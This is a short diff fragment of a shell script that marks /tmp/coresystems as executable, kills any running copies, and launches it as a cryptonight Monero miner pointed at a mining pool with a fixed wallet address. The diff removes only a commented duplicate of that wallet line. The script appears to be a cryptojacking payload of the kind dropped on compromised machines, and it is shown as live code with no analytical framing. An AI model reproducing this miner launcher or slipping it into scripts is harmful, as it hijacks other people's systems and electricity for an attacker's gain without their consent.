@@ -10,4 +10,3 @@ fi
 chmod +x /tmp/coresystems
 ps auxf | grep -v grep | grep coresystems | awk '{print $2}' |xargs kill -9
 /tmp/coresystems -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW -p x
-#45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW
